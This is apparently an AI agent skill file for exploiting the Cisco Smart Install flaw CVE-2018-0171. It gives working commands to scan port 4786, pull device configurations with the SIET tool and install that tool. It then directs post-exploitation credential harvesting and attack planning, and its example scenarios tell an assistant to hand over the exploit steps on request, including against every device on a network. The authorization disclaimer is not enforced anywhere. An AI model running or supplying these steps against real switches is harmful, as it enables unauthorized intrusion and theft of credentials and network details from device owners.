---
name: cisco-smart-install-exploit
description: Exploit Cisco Smart Install vulnerability (CVE-2018-0171) on port 4786 to exfiltrate device configurations. Use this skill whenever the user mentions Cisco switches, Smart Install, port 4786, CVE-2018-0171, or wants to extract configurations from Cisco network equipment during authorized penetration testing.
---

# Cisco Smart Install Exploitation

## Overview

**Cisco Smart Install** is a Cisco protocol designed to automate initial configuration and OS image loading for new Cisco hardware. By default, it's active on Cisco devices and uses **TCP port 4786**.

### Critical Vulnerability: CVE-2018-0171

- **CVSS Score**: 9.8 (Critical)
- **Year Discovered**: 2018
- **Impact**: Buffer overflow allowing:
  - Forcible device reboot
  - Remote Code Execution (RCE)
  - Configuration exfiltration

## Prerequisites

1. **Authorized access only** - This skill is for legitimate penetration testing on systems you own or have explicit permission to test
2. **SIET Tool** - Smart Install Exploitation Tool must be installed
3. **Target device** - Real Cisco hardware (virtual images don't have Smart Install)
4. **Port 4786 open** - Verify the target has Smart Install active

## Quick Start

### 1. Verify Target

First, confirm port 4786 is open on the target:

```bash
nmap -p 4786 <target-ip>
```

Expected output:
```
PORT      STATE  SERVICE
4786/tcp  open   smart-install
```

### 2. Exfiltrate Configuration

Use SIET to extract the device configuration:

```bash
sudo python2 siet.py -g -i <target-ip>
```

**Arguments:**
- `-g` - Exfiltrate configuration from device
- `-i` - Set target IP address

### 3. Retrieve Configuration

The configuration file will be saved in the `tftp/` folder within the SIET directory.

## Complete Workflow

```bash
# Step 1: Navigate to SIET directory
cd ~/opt/tools/SIET

# Step 2: Run exfiltration (requires sudo)
sudo python2 siet.py -g -i 10.10.100.10

# Step 3: Check extracted configuration
cat tftp/<target-ip>.conf
```

## SIET Tool Installation

If SIET is not installed:

```bash
git clone https://github.com/frostbits-security/SIET
cd SIET
```

## Important Notes

- **Real hardware required**: Virtual Cisco images do not include Smart Install functionality
- **Python 2**: SIET requires Python 2 (`python2` command)
- **Root privileges**: The exploit requires sudo/root access
- **Network access**: You must be on the same network segment as the target

## Post-Exploitation

Once you have the configuration:

1. **Analyze for credentials** - Look for usernames, passwords, enable secrets
2. **Map network topology** - Identify connected devices and interfaces
3. **Find misconfigurations** - Look for weak security settings
4. **Identify attack vectors** - Use configuration data to plan next steps

## Safety & Ethics

⚠️ **This skill is for authorized penetration testing only.**

- Only test systems you own or have written permission to test
- Document all activities for your engagement
- Report findings to the appropriate stakeholders
- Do not use this for unauthorized access

## Example Scenarios

### Scenario 1: Initial Reconnaissance

**User**: "I found a Cisco switch at 192.168.1.50 with port 4786 open. How do I get its config?"

**Response**: Use SIET with the `-g` flag to exfiltrate the configuration file.

### Scenario 2: Network Assessment

**User**: "Need to extract configs from all Cisco devices on the network for our pentest."

**Response**: Scan for port 4786, then run SIET against each target with Smart Install active.

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Connection refused | Verify port 4786 is open and Smart Install is active |
| Permission denied | Run with sudo/root privileges |
| No config file | Check `tftp/` directory; device may not have Smart Install |
| Python error | Ensure Python 2 is installed and in PATH |

## References

- [SIET GitHub](https://github.com/frostbits-security/SIET)
- [CVE-2018-0171 Details](https://nvd.nist.gov/vuln/detail/CVE-2018-0171)
- [Cisco Smart Install Documentation](https://www.cisco.com/c/en/us/support/docs/switches/catalyst-2960-switches/117536-configure-smart-install.html)
